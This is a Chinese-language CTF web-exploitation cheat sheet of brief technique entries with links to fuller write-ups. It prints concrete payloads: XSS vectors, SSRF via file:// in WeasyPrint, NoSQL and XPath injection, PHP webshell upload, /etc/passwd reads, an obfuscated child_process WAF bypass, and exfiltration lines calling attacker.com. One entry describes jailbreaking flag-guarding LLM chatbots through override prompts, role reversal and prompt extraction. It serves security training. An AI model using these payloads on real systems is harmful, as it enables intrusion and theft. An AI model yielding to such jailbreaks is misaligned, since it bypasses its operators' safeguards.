## Flask/Werkzeug 调试模式

弱会话密钥爆破 + 伪造管理员会话 + Werkzeug 调试器 PIN RCE。完整攻击链见 [server-side-advanced.md](server-side-advanced.md#flaskwerkzeug-调试模式利用)。

<a id="xxe-with-external-dtd-filter-bypass"></a>
## 借助外部 DTD 绕过过滤的 XXE

把恶意 DTD 托管在外部以绕过上传关键字过滤。payload 与 webhook.site 配置见 [server-side-advanced.md](server-side-advanced.md#可绕过过滤器的外部-dtd-xxe)。

<a id="jsfuck-decoding"></a>
## JSFuck 解码

去掉末尾的 `()()`，在 Node.js 里 eval，`.toString()` 即可揭示原始代码。见 [client-side.md](client-side.md#jsfuck-解码)。

<a id="dom-xss-via-jquery-hashchange-crypto-cat"></a>
## jQuery hashchange 触发的 DOM XSS（Crypto-Cat）

`$(location.hash)` + `hashchange` 事件 → 通过 iframe 触发 XSS：`<iframe src="https://target/#" onload="this.src+='<img src=x onerror=print()>'">`。见 [client-side.md](client-side.md#jquery-hashchange-触发的-dom-xsscrypto-cat)。

<a id="shadow-dom-xss"></a>
## Shadow DOM XSS

用 Proxy 包装 `attachShadow` 捕获 closed root；`(0,eval)` 逃逸作用域；`</script>` 注入。见 [client-side.md](client-side.md#shadow-dom-xss)。

<a id="dom-clobbering--mime-mismatch"></a>
## DOM Clobbering + MIME 不匹配

`.jpg` 被以 `text/html` 返回；`<form id="config">` 可覆盖 JS 全局变量。见 [client-side.md](client-side.md#dom-clobbering--mime-不匹配)。

<a id="http-request-smuggling-via-cache-proxy"></a>
## 通过缓存代理实现 HTTP 请求走私

利用不完整的 POST body 造成缓存代理失步以窃取 Cookie。见 [client-side.md](client-side.md#通过缓存代理实现-http-请求走私)。

<a id="path-traversal-url-encoded-slash-bypass"></a>
## 路径穿越：URL 编码斜杠绕过

`%2f` 绕过 nginx 路由匹配，但文件系统会正常解析它。见 [server-side-advanced.md](server-side-advanced.md#路径穿越url-编码斜杠绕过)。

<a id="weasyprint-ssrf--file-read-cve-2024-28184"></a>
## WeasyPrint SSRF 与文件读取（CVE-2024-28184）

`<a rel="attachment" href="file:///flag.txt">` 或 `<link rel="attachment" href="http://127.0.0.1/admin">`——WeasyPrint 把拉取到的内容嵌入为 PDF 附件，绕过头部检查。用 `/Type /EmbeddedFile` 是否存在作布尔 oracle。见 [server-side-advanced-4.md](server-side-advanced-4.md#weasyprint-ssrf-与文件读取cve-2024-28184nullcon-2026) 和 [cves.md](cves.md#cve-2024-28184weasyprint-附件-ssrf--文件读取)。

<a id="mongodb-regex--where-blind-injection"></a>
## MongoDB 正则 / $where 盲注

用 `a^/)||(<condition>)&&(/a^` 逃出 `/.../i` 正则。二分 `charCodeAt()` 提取。见 [server-side-advanced-4.md](server-side-advanced-4.md#mongodb-正则注入--where-盲注-oraclenullcon-2026)。

<a id="pongo2--go-template-injection"></a>
## Pongo2 / Go 模板注入

上传文件里写 `{% include "/flag.txt" %}`，再在模板参数里做路径穿越。见 [server-side-advanced-4.md](server-side-advanced-4.md#pongo2--go-模板注入经路径穿越nullcon-2026)。

<a id="zip-upload-with-php-webshell"></a>
## ZIP 上传配 PHP Webshell

上传含 `.php` 的 ZIP → 解压到 Web 可访问目录 → `file_get_contents('/flag.txt')`。见 [server-side-advanced-4.md](server-side-advanced-4.md#上传-zip-携带-php-webshellnullcon-2026)。

<a id="basename-bypass-for-hidden-files"></a>
## basename() 绕过读取隐藏文件

`basename()` 只剥离目录，不过滤同目录下的 `.lock` 或隐藏文件。见 [server-side-advanced-4.md](server-side-advanced-4.md#basename-绕过读取隐藏文件nullcon-2026)。

<a id="custom-linear-mac-forgery"></a>
## 自定义线性 MAC 伪造

基于 XOR 的线性签名配密钥块 → 从已知样本恢复 → 为目标伪造。见 [auth-and-access.md](auth-and-access.md#自定义线性-mac签名伪造nullcon-2026)。

<a id="cssjs-paywall-bypass"></a>
## CSS/JS 付费墙绕过

藏在 CSS 覆盖层（`position: fixed; z-index: 99999`）后面的内容仍在原始 HTML 里。`curl` 或看源码即可瞬间绕过。见 [client-side.md](client-side.md#cssjs-付费墙绕过)。

<a id="ssrf-to-docker-api-rce-chain"></a>
## SSRF 到 Docker API RCE 链

SSRF 到 2375 端口未认证的 Docker daemon。用 `/archive` 提取文件，用 `/exec` + `/exec/{id}/start` 执行命令。SSRF 仅支持 GET 时，经内网 POST 中继串联。见 [server-side-advanced-2.md](server-side-advanced-2.md#ssrf-打-docker-api-的-rce-链h7ctf-2025)。

<a id="castor-xml-deserialization-via-xsitype-atlas-htb"></a>
## 通过 xsi:type 的 Castor XML 反序列化（Atlas HTB）

没有映射文件的 Castor XML `Unmarshaller` 会信任 `xsi:type` 属性来实例化任意 Java 类。经 JNDI（Java Naming and Directory Interface）/ RMI（Remote Method Invocation）+ ysoserial `CommonsBeanutils1` 串联实现 RCE。需要 Java 11（17+ 不行）。检查 `pom.xml` 是否有 `castor-xml`。见 [server-side-advanced-2.md](server-side-advanced-2.md#castor-xml-的-xsitype-多态反序列化atlas-htb)。

<a id="apache-errordocument-expression-file-read-zero-htb"></a>
## Apache ErrorDocument 表达式文件读取（Zero HTB）

`.htaccess` 里写 `ErrorDocument 404 "%{file:/etc/passwd}"` 可在 Apache 层读文件，绕过 `php_admin_flag engine off`。需要 `AllowOverride FileInfo`。经 SFTP 上传，再用 404 请求触发。见 [server-side-advanced-2.md](server-side-advanced-2.md#apache-errordocument-表达式读文件zero-htb)。

<a id="http-trace-method-bypass"></a>
## HTTP TRACE 方法绕过

GET/POST 返回 403 的端点，可能对 TRACE、PUT、PATCH 或 DELETE 有响应。用 `curl -X TRACE` 测。见 [auth-and-access.md](auth-and-access.md#http-trace-方法绕过bypass-ctf-2025)。

<a id="llmai-chatbot-jailbreak"></a>
## LLM/AI 聊天机器人越狱

守护 flag 的 AI 聊天机器人可用系统覆盖提示、角色反转或指令泄露请求绕过。轮换 session ID 并逐步升级提示强度。见 [auth-and-access.md](auth-and-access.md#llmai-聊天机器人越狱bypass-ctf-2025)。

<a id="admin-bot-javascript-url-scheme-bypass"></a>
## 管理机器人 javascript: URL 协议绕过

`new URL()` 只校验语法，不校验协议——`javascript:` URL 能通过，并在 Puppeteer 的已认证上下文中执行。目标页的 CSP/SRI 无关紧要，因为 JS 是在导航上下文里运行的。见 [client-side.md](client-side.md#管理机器人-javascript-url-协议绕过dicectf-2026)。

<a id="xs-leak-via-image-load-timing--graphql-csrf-htb-grandmonty"></a>
## 利用图片加载时序的 XS-Leak + GraphQL CSRF（HTB GrandMonty）

HTML 注入 → meta refresh 重定向（绕过 CSP）→ 管理机器人加载攻击者页面 → JavaScript 用 `new Image().src` 向 `localhost` 的 GraphQL 端点发跨源 GET → 通过图片错误时序测量时间盲 SQLi（`SLEEP(1)`）→ 逐字符外带 flag。GraphQL GET 请求绕过 CORS 预检。见 [client-side.md](client-side.md#利用图片加载时序做-xs-leak--graphql-csrfhtb-grandmonty)。

<a id="react-server-components-flight-protocol-rce-ehax-2026"></a>
## React Server Components Flight 协议 RCE（Ehax 2026）

通过 `Next-Action` + `Accept: text/x-component` 头识别。CVE-2025-55182：伪造的 Flight chunk 利用构造器链执行服务端 JS。通过 `NEXT_REDIRECT` 错误 → `x-action-redirect` 头外带。WAF 绕过：`'chi'+'ld_pro'+'cess'` 或 hex `'\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'`。见 [server-side-advanced-4.md](server-side-advanced-4.md#react-server-components-flight-协议-rceehax-2026) 和 [cves.md](cves.md#cve-2025-55182--cve-2025-66478react-server-components-flight-协议-rce)。

<a id="unicode-case-folding-xss-bypass-unbreakable-2026"></a>
## Unicode 大小写折叠 XSS 绕过（UNbreakable 2026）

**模式：** 净化正则只用 ASCII 匹配（`<\s*script`），但下游处理会做 Unicode 大小写折叠（`strings.EqualFold`）。`<ſcript>`（U+017F 拉丁长 s）绕过正则，却会被折叠成 `<script>`。其他对：`ı`→`i`、`K`（U+212A）→`k`。见 [client-side-advanced.md](client-side-advanced.md#unicode-大小写折叠-xss-绕过unbreakable-2026)。

<a id="css-font-glyph--container-query-data-exfiltration-unbreakable-2026"></a>
## CSS 字体字形 + 容器查询数据外带（UNbreakable 2026）

**模式：** 不用 JS，通过 CSS 注入外带内联文本。自定义字体为每个字符赋予唯一字形宽度。容器查询命中宽度区间时触发 background-image 请求——每个字符一次请求。在严格 CSP 下依然有效。见 [client-side-advanced.md](client-side-advanced.md#css-字体字形宽度--容器查询外带unbreakable-2026)。

<a id="hyperscript--alpinejs-cdn-csp-bypass-unbreakable-2026"></a>
## Hyperscript / Alpine.js CDN CSP 绕过（UNbreakable 2026）

**模式：** CSP 允许 `cdnjs.cloudflare.com`。从 CDN 加载 Hyperscript（`_=` 属性）或 Alpine.js（`x-data`、`x-init`）——它们会执行净化器不会剥离的 HTML 属性中的代码。见 [client-side-advanced.md](client-side-advanced.md#hyperscript-cdn-csp-绕过unbreakable-2026)。

<a id="solidity-transient-storage-clearing-collision-0828-0833"></a>
## Solidity 瞬态存储清理碰撞（0.8.28-0.8.33）

**模式：** Solidity IR 流水线（`--via-ir`）会为同类型持久变量和瞬态变量的 `delete` 生成同名 Yul 辅助函数。一个用 `sstore`，另一个本应用 `tstore`，但去重只保留了一个。利用方式：通过瞬态 `delete` 覆写 `owner`（slot 0），或让持久 `delete`（撤销授权）失效。变通：用 `_lock = address(0)` 代替 `delete _lock`。见 [web3.md](web3.md#solidity-瞬态存储清理辅助函数冲突solidity-0828-0833)。

<a id="chrome-unicode-url-normalization-bypass-rctf-2017"></a>
## Chrome Unicode URL 规范化绕过（RCTF 2017）

Chrome 的 IDNA/punycode 规范化会把全角 Unicode 字符（U+FF00–U+FF5E）转成 ASCII 等价物，绕过域名的长度检查与字符过滤。见 [client-side-advanced.md](client-side-advanced.md#chrome-unicode-url-规范化绕过rctf-2017)。

<a id="csp-nonce-bypass-via-base-tag-hijacking-bsidessf-2026"></a>
## 通过 base 标签劫持绕过 CSP Nonce（BSidesSF 2026）

**模式：** CSP 用 `script-src 'nonce-xxx'` 但缺少 `base-uri` 指令。在带 nonce 的 `<script src="相对.js">` 之前注入 `<base href="https://attacker.com/">`——脚本从攻击者服务器加载，却因合法 nonce 满足 CSP。防御：始终包含 `base-uri 'self'`。见 [client-side-advanced.md](client-side-advanced.md#通过-base-标签劫持绕过-csp-noncebsidessf-2026)。

<a id="ja4ja4h-tls-fingerprint-matching-bsidessf-2026"></a>
## JA4/JA4H TLS 指纹匹配（BSidesSF 2026）

**模式：** 服务器除 User-Agent 外，还用 JA4（TLS ClientHello 指纹）和 JA4H（HTTP 头顺序指纹）校验浏览器身份。只伪造 UA 会失败；必须匹配目标浏览器的 TLS 密码套件顺序和 HTTP 头序列。对老旧浏览器，直接跑真实浏览器。见 [auth-and-access.md](auth-and-access.md#ja4ja4h-tls-与-http-指纹匹配bsidessf-2026)。

<a id="client-side-hmac-bypass-via-leaked-js-secret-codegate-2013"></a>
## 借泄露的 JS 密钥绕过客户端 HMAC（Codegate 2013）

反混淆客户端 JS 取出硬编码的 HMAC 密钥，然后在浏览器控制台为任意请求伪造签名。见 [client-side-advanced.md](client-side-advanced.md#借泄露的-js-密钥绕过客户端-hmaccodegate-2013)。

<a id="sqli-keyword-fragmentation-bypass-secuinside-2013"></a>
## SQLi 关键字拆解绕过（SecuInside 2013）

单趟 `preg_replace()` 关键字过滤可用嵌套方式绕过：在 payload 里把被剥离的关键字嵌进去，`unload_fileon` 在移除 `load_file` 后变成 `union`。见 [server-side-exec-2.md](server-side-exec-2.md#sqli-关键字碎片化绕过secuinside-2013)。

<a id="pickle-chaining-via-stop-opcode-stripping-volgactf-2013"></a>
## 通过剥离 STOP 操作码串联 Pickle（VolgaCTF 2013）

从第一个 payload 中剥掉 pickle 的 STOP 操作码（`\x2e`），再拼接第二个——两次 `__reduce__` 调用在单次 `pickle.loads()` 中都会执行。串联 `os.dup2()` 把输出重定向到 socket。见 [server-side-deser.md](server-side-deser.md#通过剥离-stop-操作码实现-pickle-链式执行volgactf-2013)。

<a id="xpath-blind-injection-baltctf-2013"></a>
## XPath 盲注（BaltCTF 2013）

`substring(normalize-space(../../../node()),1,1)='a'`——通过响应长度 oracle 对 XML 数据存储做布尔盲注提取。见 [server-side-exec.md](server-side-exec.md#xpath-盲注baltctf-2013)。

<a id="sqlite-file-path-traversal-to-bypass-string-equality-codegate-2013"></a>
## SQLite 文件路径穿越绕过字符串相等（Codegate 2013）

输入 `/../gamesim_GM` 通不过 `== "GM"` 字符串检查，但文件系统会把 `/var/game_db/gamesim_/../gamesim_GM.db` 规范化成被拦截的路径。见 [server-side-advanced-2.md](server-side-advanced-2.md#sqlite-文件路径穿越绕过字符串相等判断codegate-2013)。

<a id="php-serialization-length-manipulation-via-filter-word-expansion-0ctf-2016"></a>
## 借过滤词扩展操纵 PHP 序列化长度（0CTF 2016）

序列化之后的字符串过滤器把 "where"（5 字符）替换成 "hacker"（6 字符）。重复 "where" N 次，让扩展溢出的字节数恰好足够注入一个序列化字段（`";}s:5:"photo";s:10:"config.php";}`）。见 [server-side-deser.md](server-side-deser.md#通过过滤词扩展操纵-php-序列化长度0ctf-2016)。

<a id="csp-bypass-via-link-prefetch-boston-key-party-2016"></a>
## 通过 link prefetch 绕过 CSP（Boston Key Party 2016）

`<link rel="prefetch" href="http://attacker.com/steal">` 不受 CSP `script-src` 拦截。另有 `<meta http-equiv="refresh">`。实现无脚本数据外带。见 [client-side-advanced.md](client-side-advanced.md#通过-link-prefetch-绕过-cspboston-key-party-2016)。

<a id="xml-injection-via-x-forwarded-for-header-pwn2win-2016"></a>
## 通过 X-Forwarded-For 头做 XML 注入（Pwn2Win 2016）

服务器用请求头拼 XML 却不转义。经 X-Forwarded-For 注入 `</ip><admin>true</admin><ip>`；XML 解析取第一个标签。见 [server-side-2.md](server-side-2.md#经-x-forwarded-for-头的-xml-注入pwn2win-2016)。

<a id="base64-decode-leniency-and-parameter-override-for-signature-bypass-bctf-2016"></a>
## Base64 解码宽松性 + 参数覆盖绕过签名（BCTF 2016）

`b64decode()` 会静默忽略非 base64 字符。在签名后追加 `&price=0`——b64decode 会剥掉它，但参数解析器会处理它（后值覆盖前值）。见 [auth-infra.md](auth-infra.md#base64-解码宽容--参数覆盖绕过签名bctf-2016)。

<a id="common-flag-locations"></a>
## 常见 flag 位置

文件：`/flag.txt`、`/flag`、`/app/flag.txt`、`/home/*/flag*`。环境变量：`/proc/self/environ`。数据库：`flag`、`flags`、`secret` 表。响应头：`x-flag`、`x-archive-tag`、`x-proof`。DOM：`display:none` 元素、`data-*` 属性。
按类别分组的批量 payload 词表见 pat-reference.md。
